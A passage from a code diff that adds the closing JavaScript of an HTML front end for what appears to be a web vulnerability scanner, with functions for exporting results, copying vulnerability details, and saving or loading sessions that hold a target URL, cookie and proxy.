+  a.click();
+  notify('Results exported', 'success');
+}
+
+function copyVuln(id) {
+  const v = state.vulns.find(x => x.id === id);
+  if (v) {
+    navigator.clipboard.writeText(JSON.stringify(v, null, 2));
+    notify('Vuln details copied', 'success');
+  }
+}
+
+async function browseFile(fieldId) {
+  const p = await api.openFile();
+  if (p) {
+    document.getElementById(fieldId).value = p;
+    updateCmdPreview();
+  }
+}
+
+async function saveSession() {
+  const data = {
+    config: {
+      url: document.getElementById('targetUrl').value,
+      cookie: document.getElementById('cookie').value,
+      proxy: document.getElementById('proxy').value,
+    },
+    history: state.scanHistory,
+    vulns: state.vulns,
+  };
+  const p = await api.saveSession(data);
+  if (p) notify(`Session saved: ${p}`, 'success');
+}
+
+async function loadSession() {
+  const data = await api.loadSession();
+  if (data) {
+    if (data.config) {
+      document.getElementById('targetUrl').value = data.config.url || '';
+      document.getElementById('cookie').value = data.config.cookie || '';
+      document.getElementById('proxy').value = data.config.proxy || '';
+    }
+    if (data.history) state.scanHistory = data.history;
+    if (data.vulns) state.vulns = data.vulns;
+    renderHistory();
+    renderResults();
+    updateCmdPreview();
+    updateVulnBadge();
+    notify('Session loaded', 'success');
+  }
+}
+
+function notify(msg, type = 'info') {
+  const container = document.getElementById('notif-container');
+  const div = document.createElement('div');
+  div.className = `notif notif-${type}`;
+  div.textContent = msg;
+  container.appendChild(div);
+  setTimeout(() => div.style.opacity = '0', 2700);
+  setTimeout(() => div.remove(), 3000);
+}
+
+// ══════════════════════════════════════════════════════════
+//  BOOT
+// ══════════════════════════════════════════════════════════
+init();
+</script>
+</body>
+</html>
